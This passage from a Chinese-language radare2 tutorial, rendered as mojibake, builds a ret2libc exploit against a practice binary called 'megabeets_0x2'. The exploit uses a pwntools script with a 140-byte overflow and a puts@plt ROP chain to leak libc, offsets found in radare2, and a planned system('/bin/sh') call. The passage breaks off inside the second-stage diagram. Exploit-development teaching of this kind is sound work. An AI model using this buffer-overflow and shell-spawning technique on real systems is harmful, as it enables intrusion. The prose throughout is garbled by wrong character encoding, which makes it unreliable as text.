id="æ³„æ¼putsçš„åœ°å€"><a href="#æ³„æ¼putsçš„åœ°å€" class="headerlink" title="æ³„æ¼putsçš„åœ°å€"></a>æ³„æ¼<code>puts</code>çš„åœ°å€</h2><p>æˆ‘ä»¬éœ€è¦ç”¨åˆ°<code>ret2plt</code>æ¥æ³„æ¼<code>puts</code>çš„çœŸå®åœ°å€ã€‚<code>PLT</code>ï¼ˆ<em>Procedure Linkage Table</em>ï¼‰æ˜¯å†…å­˜ä¸­çš„ç»“æ„ä½“ï¼Œå®ƒåŒ…æ‹¬ä¸€å°æ®µä»£ç ï¼Œèƒ½å¤Ÿè·³è½¬åˆ°åœ¨åŠ¨æ€é“¾æ¥æ—¶ç¨‹åºä¹‹å¤–çš„å‡½æ•°åœ°å€ã€‚ä¸ç®¡ä»€ä¹ˆæ—¶å€™ï¼Œæˆ‘ä»¬åœ¨<code>.text</code>æ®µçœ‹åˆ°<code>CALL</code>æŒ‡ä»¤ï¼Œå¹¶ä¸æ˜¯ç›´æ¥è·³åˆ°å‡½æ•°ã€‚å®é™…ä¸Šï¼Œå®ƒè·³è½¬åˆ°äº†<code>PLT</code>ä¸­çš„ä¸€å°æ®µä»£ç ï¼Œåƒæ˜¯<code>func_name@plt</code>è¿™æ ·ã€‚è¿™ä¸€å°æ®µä»£ç è·³è½¬åˆ°<code>GOT</code>ï¼ˆ<em>Global Offset Table</em>ï¼‰ä¸­çš„åˆ—å‡ºçš„è¯¥å‡½æ•°çš„åœ°å€ã€‚<code>GOT</code>è¡¨å…¥å£ç‚¹ä¼šæŒ‡å›<code>PLT</code>ï¼ŒåŒæ—¶<code>PLT</code>ä¼šè°ƒç”¨ä¸€ä¸ªåŠ¨æ€é“¾æ¥å™¨æ¥ç¡®å®šè¯¥å‡½æ•°çš„çœŸå®åœ°å€ã€‚ä¸‹ä¸€æ¬¡è°ƒç”¨<code>func_name@plt</code>æ—¶ï¼Œè¿™æ®µä»£ç ä¼šç›´æ¥è·³è½¬åˆ°<code>GOT</code>è¡¨é‡Œçš„å‡½æ•°åœ°å€ã€‚æƒ³è¦äº†è§£æ›´å¤šå…³äºåŠ¨æ€é“¾æ¥çš„çŸ¥è¯†ï¼Œæˆ‘æ¨èä¼Šæ©å…°æ–¯æ³°å‹’å†™çš„<a href="https://www.airs.com/blog/archives/38" target="_blank" rel="noopener">è¿™ä¸€ç³»åˆ—å…³äºé“¾æ¥å™¨çš„æ–‡ç« </a></p><p>ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°<code>puts</code>åœ¨<code>PLT</code>ä»¥åŠ<code>GOT</code>ä¸­çš„åœ°å€ï¼Œç„¶åè°ƒç”¨<code>puts@plt</code>å¹¶ä¸”æŠŠ<code>puts@got</code>ä½œä¸ºå‚æ•°ã€‚æˆ‘ä»¬å°†æŠŠè¿™äº›è°ƒç”¨è¿åœ¨ä¸€èµ·ï¼Œåœ¨<code>scanf</code>æ—¶ä¼ ç»™ç¨‹åºã€‚ç„¶åæˆ‘ä»¬ä¼šè¿”å›åˆ°æˆ‘ä»¬åˆ©ç”¨çš„ç¬¬äºŒä¸ªé˜¶æ®µã€‚<code>puts</code>å°†ä¼šæŠŠå®ƒçœŸå®çš„åœ°å€è¾“å‡ºå‡ºæ¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">|       Stage 1       |</span><br><span class="line">+---------------------+</span><br><span class="line">| padding (140 bytes) |</span><br><span class="line">| puts@plt            |</span><br><span class="line">| entry_point         |</span><br><span class="line">| puts@got            |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><p>ç¼–å†™è„šæœ¬æˆ‘ä»¬éœ€è¦ä½¿ç”¨<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"><em>pwnlib</em></a>æ¡†æ¶ï¼Œè€Œä¸”å®ƒæ˜¯æˆ‘æœ€å–œæ¬¢çš„pythonæ¼æ´åˆ©ç”¨æ¡†æ¶ã€‚ä»–ç®€åŒ–äº†å¾ˆå¤šä¸œè¥¿ï¼Œè®©åˆ©ç”¨æ›´ç®€ä¾¿ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ä½ å–œæ¬¢çš„æ–¹å¼ã€‚</p><p>ä½¿ç”¨<code>pip</code>ä¸‹è½½<em>pwntools</em>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> pip install --upgrade pip</span><br><span class="line"><span class="meta">$</span> pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p>ä½ å¯ä»¥åœ¨<a href="http://docs.pwntools.com/en/stable/index.html" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a>ä¸Šäº†è§£æ›´å¤šå…³äº<em>pwntools</em>ã€‚</p><p>è¿™æ˜¯æˆ‘ä»¬ç¬¬ä¸€é˜¶æ®µçš„pythonè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt =</span><br><span class="line">puts_got =</span><br><span class="line">entry_point =</span><br><span class="line"> </span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open process</span></span><br><span class="line">    p = process(<span class="string">"./megabeets_0x2"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload  =  <span class="string">"A"</span>*<span class="number">140</span> <span class="comment"># padding</span></span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Take 4 bytes of the output</span></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">"puts is at: 0x%x"</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å¡«å……<code>puts@plt</code>å’Œ<code>puts@got</code>çš„åœ°å€ï¼Œä»¥åŠç¨‹åºçš„å…¥å£ç‚¹ã€‚è®©æˆ‘ä»¬å›åˆ°<code>radare2</code>å¹¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ã€‚å­—ç¬¦<code>#</code>ç”¨äºæ³¨é‡Šï¼Œå­—ç¬¦<code>~</code>æ˜¯<code>radare2</code>çš„shellä¸­çš„å†…ç½®<code>grep</code>ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf7763b30]&gt;</span> # the address of puts@plt:</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> ?v sym.imp.puts</span><br><span class="line">0x08048390</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> # the address of puts@got:</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> ?v reloc.puts_20</span><br><span class="line">0x0804a014</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> # the address of programâ€™s entry point (entry0):</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> ieq</span><br><span class="line">0x080483d0</span><br></pre></td></tr></table></figure><p><code>sym.imp.puts</code>å’Œ<code>reloc.puts_20</code>æ˜¯<code>radare2</code>è‡ªåŠ¨æ£€æµ‹åˆ°çš„æ ‡å¿—ã€‚å‘½ä»¤<code>ie</code>è¡¨ç¤º<code>Information Entrypoint</code>ã€‚</p><p>ç°åœ¨æˆ‘ä»¬å¡«å…¥æˆ‘ä»¬æ‰¾åˆ°çš„åœ°å€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">puts_got = <span class="number">0x804a014</span></span><br><span class="line">entry_point = <span class="number">0x80483d0</span></span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹è„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> python exploit.py</span><br><span class="line">[+] Starting local process â€˜./megabeets_0x2â€™: pid 23578</span><br><span class="line">[*] puts is at: 0xf75db710</span><br><span class="line">[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23578)</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> python exploit.py</span><br><span class="line">[+] Starting local process â€˜./megabeets_0x2â€™: pid 23592</span><br><span class="line">[*] puts is at: 0xf7563710</span><br><span class="line">[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23592)</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> python exploit.py</span><br><span class="line">[+] Starting local process â€˜./megabeets_0x2â€™: pid 23606</span><br><span class="line">[*] puts is at: 0xf75e3710</span><br><span class="line">[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23606)</span><br></pre></td></tr></table></figure><p>æˆ‘æ‰§è¡Œäº†è„šæœ¬ä¸‰æ¬¡ï¼Œ<code>puts</code>çš„åœ°å€æ¯æ¬¡éƒ½ä¼šå˜å¾—ä¸ä¸€æ ·ã€‚å› æ­¤æˆ‘ä»¬ä¸èƒ½æå‰é¢„æµ‹å®ƒçš„åœ°å€ã€‚ç°åœ¨æˆ‘ä»¬éœ€è¦æ‰¾åˆ°<code>puts</code>åœ¨<em>libc</em>ä¸­çš„åç§»ï¼Œç„¶åè®¡ç®—å‡º<em>libc</em>çš„åŸºå€ã€‚åœ¨æˆ‘ä»¬æ‰¾åˆ°åŸºå€åï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åç§»è®¡ç®—å‡º<code>system</code>ã€<code>exit</code>ä»¥åŠå­—ç¬¦ä¸²<code>/bin/sh</code>çš„åœ°å€ã€‚</p><p>ç°åœ¨æˆ‘ä»¬çš„è„šæœ¬åº”è¯¥æ˜¯è¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">puts_got = <span class="number">0x804a014</span></span><br><span class="line">entry_point = <span class="number">0x80483d0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Offsets</span></span><br><span class="line">offset_puts = </span><br><span class="line">offset_system = </span><br><span class="line">offset_str_bin_sh = </span><br><span class="line">offset_exit = </span><br><span class="line"> </span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open process</span></span><br><span class="line">    p = process(<span class="string">"./megabeets_0x2"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload  =  <span class="string">"A"</span>*<span class="number">140</span></span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Take 4 bytes of the output</span></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">"puts is at: 0x%x"</span> % leak)</span><br><span class="line">    </span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate libc base</span></span><br><span class="line"> </span><br><span class="line">    libc_base = leak - offset_puts</span><br><span class="line">    log.info(<span class="string">"libc base: 0x%x"</span> % libc_base)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate offsets</span></span><br><span class="line">    system_addr = libc_base + offset_system</span><br><span class="line">    binsh_addr = libc_base + offset_str_bin_sh</span><br><span class="line">    exit_addr = libc_base  + offset_exit</span><br><span class="line"> </span><br><span class="line">    log.info(<span class="string">"system: 0x%x"</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">"binsh: 0x%x"</span> % binsh_addr)</span><br><span class="line">    log.info(<span class="string">"exit: 0x%x"</span> % exit_addr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="è®¡ç®—çœŸå®åœ°å€"><a href="#è®¡ç®—çœŸå®åœ°å€" class="headerlink" title="è®¡ç®—çœŸå®åœ°å€"></a>è®¡ç®—çœŸå®åœ°å€</h2><p><em>è¯·æ³¨æ„åœ¨æ–‡ç« çš„è¿™éƒ¨åˆ†ï¼Œæˆ‘çš„ç»“æœå¯èƒ½ä¸ä½ çš„ä¸åŒã€‚å› ä¸ºæˆ‘ä»¬çš„libcç‰ˆæœ¬ä¸åŒï¼Œæ‰€ä»¥ä¼šäº§ç”Ÿä¸åŒçš„åç§»ã€‚</em></p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ‰¾åˆ°<code>puts</code>åœ¨<em>libc</em>ä¸Šçš„åç§»ã€‚æˆ‘ä»¬å†ä¸€æ¬¡æ‰“å¼€<code>radare2</code>ï¼Œç»§ç»­æ‰§è¡Œåˆ°å…¥å£ç‚¹ã€‚åšä»¥ä¸Šæ­¥éª¤çš„åŸå› æ˜¯æˆ‘ä»¬åœ¨<em>libc</em>è½½å…¥ä¹‹å‰å¼€å§‹è°ƒè¯•ç¨‹åºï¼Œç›´åˆ°å…¥å£ç‚¹æ—¶ï¼Œè¿è¡Œåº“æ‰å…¨éƒ¨åŠ è½½å®Œã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨<code>dmi</code>å‘½ä»¤ï¼Œå°†<em>libc</em>å’Œå‡½æ•°ä½œä¸ºå‚æ•°ã€‚æˆ‘åŠ ä¸Šäº†<code>~</code>æ¥æ˜¾ç¤ºç›¸å…³çš„ä¿¡æ¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> r2 -d megabeets_0x2</span><br><span class="line">Process with PID 24124 startedâ€¦</span><br><span class="line">= attach 24124 24124</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32</span><br><span class="line">â€” A C program is like a fast dance on a newly waxed dance floor by people carrying razors â€“ Waldi Ravens</span><br><span class="line"></span><br><span class="line"><span class="meta">[0xf771ab30]&gt;</span> dcu entry0</span><br><span class="line">Continue until 0x080483d0 using 1 bpsize</span><br><span class="line">hit breakpoint at: 80483d0</span><br><span class="line"></span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span> dmi libc puts~ puts$</span><br><span class="line">vaddr=0xf758f710 paddr=0x00062710 ord=6490 fwd=NONE sz=474 bind=GLOBAL type=FUNC name=puts</span><br><span class="line"></span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span> dmi libc system~ system$</span><br><span class="line">vaddr=0xf7569060 paddr=0x0003c060 ord=6717 fwd=NONE sz=55 bind=WEAK type=FUNC name=system</span><br><span class="line"></span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span> dmi libc exit~ exit$</span><br><span class="line">vaddr=0xf755c180 paddr=0x0002f180 ord=5904 fwd=NONE sz=33 bind=LOCAL type=FUNC name=exit</span><br></pre></td></tr></table></figure><p><em>è¯·æ³¨æ„ï¼Œåœ¨è¿™ç¯‡æ–‡ç« å‘è¡¨å‰ï¼Œ<code>dmi</code>çš„è¾“å‡ºæ ¼å¼å°±å·²ç»æ”¹å˜äº†ã€‚ä½ çš„ç»“æœå¾ˆæœ‰å¯èƒ½ä¸æˆ‘çš„æœ‰æ‰€ä¸åŒã€‚</em></p><p>æ‰€æœ‰è¿™äº›<code>paddr=0x000xxxxx</code>æ˜¯å‡½æ•°åœ¨<em>libc</em>ä¸Šçš„åç§»ã€‚ç°åœ¨æˆ‘ä»¬éœ€è¦åœ¨ç¨‹åºä¸­æ‰¾åˆ°<code>/bin/sh</code>çš„ä½ç½®ã€‚æˆ‘ä»¬å°†è¦ä½¿ç”¨<code>radare2</code>çš„ä¸€äº›æœç´¢åŠŸèƒ½ã€‚<code>radare2</code>é»˜è®¤åœ¨<code>dbg.map</code>ï¼Œä¹Ÿå°±æ˜¯å½“å‰å†…å­˜ä¸­æŸ¥æ‰¾ã€‚æˆ‘ä»¬æƒ³è¦åœ¨æ‰€æœ‰å†…å­˜ä¸­æŸ¥æ‰¾åˆ™éœ€è¦è®¾ç½®æˆï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x080483d0]&gt;</span> e search.in = dbg.maps</span><br></pre></td></tr></table></figure><p>ä½ å¯ä»¥æ‰§è¡Œ<code>e search.in=?</code>æŸ¥çœ‹æ›´å¤šé€‰é¡¹ã€‚æ‰§è¡Œ<code>Ve</code>é…ç½®å¯è§†åŒ–æ¨¡å¼</p><p>åœ¨<code>radare2</code>ä¸­é€šè¿‡<code>/</code>å‘½ä»¤æŸ¥æ‰¾ã€‚è®©æˆ‘ä»¬çœ‹çœ‹<code>radare2</code>ç»™æˆ‘ä»¬æä¾›çš„æŸ¥æ‰¾å‚æ•°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">|Usage: /[amx/] [arg]Search stuff (see â€˜e??searchâ€™ for options)</span><br><span class="line">| / foo\x00           search for string â€˜foo\0â€™</span><br><span class="line">| /j foo\x00          search for string â€˜foo\0â€™ (json output)</span><br><span class="line">| /! ff               search for first occurrence not matching</span><br><span class="line">| /+ /bin/sh          construct the string with chunks</span><br><span class="line">| /!x 00              inverse hexa search (find first byte != 0x00)</span><br><span class="line">| //                  repeat last search</span><br><span class="line">| /h[t] [hash] [len]  find block matching this hash. See /#?</span><br><span class="line">| /a jmp eax          assemble opcode and search its bytes</span><br><span class="line">| /A jmp              find analyzed instructions of this type (/A? for help)</span><br><span class="line">| /b                  search backwards</span><br><span class="line">| /B                  search recognized RBin headers</span><br><span class="line">| /c jmp [esp]        search for asm code</span><br><span class="line">| /C[ar]              search for crypto materials</span><br><span class="line">| /d 101112           search for a deltified sequence of bytes</span><br><span class="line">| /e /E.F/i           match regular expression</span><br><span class="line">| /E esil-expr        offset matching given esil expressions %%= here</span><br><span class="line">| /f file [off] [sz]  search contents of file with offset and size</span><br><span class="line">| /i foo              search for string â€˜fooâ€™ ignoring case</span><br><span class="line">| /m magicfile        search for matching magic file (use blocksize)</span><br><span class="line">| /o                  show offset of previous instruction</span><br><span class="line">| /p patternsize      search for pattern of given size</span><br><span class="line">| /P patternsize      search similar blocks</span><br><span class="line">| /r[e] sym.printf    analyze opcode reference an offset (/re for esil)</span><br><span class="line">| /R [?] [grepopcode] search for matching ROP gadgets, semicolon-separated</span><br><span class="line">| /v[1248] value      look for an cfg.bigendian 32bit value</span><br><span class="line">| /V[1248] min max    look for an cfg.bigendian 32bit value in range</span><br><span class="line">| /w foo              search for wide string â€˜f\0o\0o\0â€™</span><br><span class="line">| /wi foo             search for wide string ignoring case â€˜f\0o\0o\0â€™</span><br><span class="line">| /x ff..33           search for hex string ignoring some nibbles</span><br><span class="line">| /x ff0033           search for hex string</span><br><span class="line">| /x ff43 ffd0        search for hexpair with mask</span><br><span class="line">| /z min max          search for strings of given size</span><br></pre></td></tr></table></figure><p>æä¾›ç»™æˆ‘ä»¬äº†è®¸å¤šä¸åŒçš„æ–¹å¼ã€‚åŒæ—¶è¿˜å‘å¿ƒ<code>/R</code>èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬æŸ¥æ‰¾ROPã€‚å¯æƒœè¿™ç¯‡æ–‡ç« é‡Œæˆ‘ä»¬æ²¡æœ‰æ‰“ç®—ä½¿ç”¨ROPã€‚ä½†å…¶ä»–æƒ…å†µä¸‹ï¼Œä½ ä»¬å†™åˆ©ç”¨è„šæœ¬æ—¶ä¸€å®šå¾ˆå–œæ¬¢ç”¨å®ƒã€‚</p><p>æˆ‘ä»¬ä¸éœ€è¦ä»»ä½•èŠ±å“¨çš„ä¸œè¥¿ï¼Œåªç”¨æœ€ç®€å•çš„æŸ¥æ‰¾å³å¯ã€‚åœ¨è¿™ä¹‹åï¼Œæˆ‘ä»¬å…ˆæ‰¾åˆ°å½“å‰<em>libc</em>è½½å…¥çš„åœ°å€ï¼Œç„¶åè®¡ç®—å‡º<code>/bin/sh</code>çš„åç§»ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x080483d0]&gt;</span> / /bin/sh</span><br><span class="line">Searching 7 bytes from 0x08048000 to 0xffd50000: 2f 62 69 6e 2f 73 68</span><br><span class="line">Searching 7 bytes in [0x8048000-0x8049000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0x8049000-0x804a000]</span><br><span class="line">hits: 0 &lt;..truncated..&gt; Searching 7 bytes in [0xf77aa000-0xf77ab000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xffd2f000-0xffd50000]</span><br><span class="line">hits: 0</span><br><span class="line">0xf7700768 hit1_0 .b/strtod_l.c-c/bin/shexit 0canonica.</span><br></pre></td></tr></table></figure><p><code>r2</code>åœ¨å†…å­˜ä¸­æ‰¾åˆ°äº†<code>/bin/sh</code>ã€‚ç°åœ¨æˆ‘ä»¬è®¡ç®—å®ƒç›¸å¯¹<em>libc</em>åŸºå€çš„åç§»ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x080483d0]&gt;</span> dmm~libc</span><br><span class="line">0xf7599000 /usr/lib32/libc-2.25.so</span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span> ?X 0xf7700768-0xf7599000</span><br><span class="line">167768</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç°<code>/bin/sh</code>ç›¸å¯¹<em>libc</em>åŸºå€çš„åç§»ä¸º<code>0x167768</code>ã€‚æˆ‘ä»¬æŠŠå®ƒå¡«è¿›è„šæœ¬ä¸­ï¼Œå¹¶ä¸”å¯ä»¥å¼€å§‹æˆ‘ä»¬çš„æœ€åä¸€ä¸ªæ­¥éª¤ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># Offsets</span></span><br><span class="line">offset_puts = <span class="number">0x00062710</span> </span><br><span class="line">offset_system = <span class="number">0x0003c060</span> </span><br><span class="line">offset_exit = <span class="number">0x0002f1b0</span></span><br><span class="line">offset_str_bin_sh = <span class="number">0x167768</span>  </span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="è·å–shell"><a href="#è·å–shell" class="headerlink" title="è·å–shell"></a>è·å–shell</h2><p>æ¼æ´åˆ©ç”¨çš„ç¬¬äºŒé˜¶æ®µå¾ˆç›´æ¥ã€‚æˆ‘ä»¬ç»§ç»­ä½¿ç”¨140ä¸ªå­—ç¬¦ï¼Œç„¶åè°ƒç”¨<code>system</code>å¹¶å°†<code>/bin/sh</code>ä½œä¸ºå‚æ•°ï¼Œæœ€å<code>exit</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">|       Stage 2       |</span><br><span class="line">+---------------------+</span><br><span class="line">| padding (140 bytes) |</span><br><span class="line">| system@libc         